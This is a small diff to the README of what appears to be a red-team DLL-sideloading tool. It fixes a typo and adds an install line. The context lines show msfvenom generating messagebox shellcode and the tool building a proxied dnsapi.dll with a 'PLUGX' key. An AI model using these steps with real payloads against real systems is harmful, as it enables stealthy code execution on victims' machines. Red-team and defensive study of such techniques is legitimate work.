@@ -55,7 +55,7 @@ python3 chinese_diad.py -i dnsapi.dll -o /tmp/chinese_diad -x 'C:\Windows\System
 
 ```
 [[ ATTACK_BOX ]]
-mkdir -p /tmp/chiese_diad
+mkdir -p /tmp/chinese_diad
 msfvenom -p windows/x64/messagebox -f raw -o /tmp/shellcode.bin
 python3 chinese_diad.py -i dnsapi.dll -o /tmp/chinese_diad -x 'C:\Windows\System32\dnsapi.dll' -k 'PLUGX' -p /tmp/shellcode.bin
 
@@ -107,3 +107,4 @@ Distributed under the Apache License. See `LICENSE.txt` for more information.
 - github.com/Pascal-0x90/sideloadr
 - github.com/tothi/dll-hijack-by-proxying
 - https://hijacklibs.net/
+apt install python3-pefile
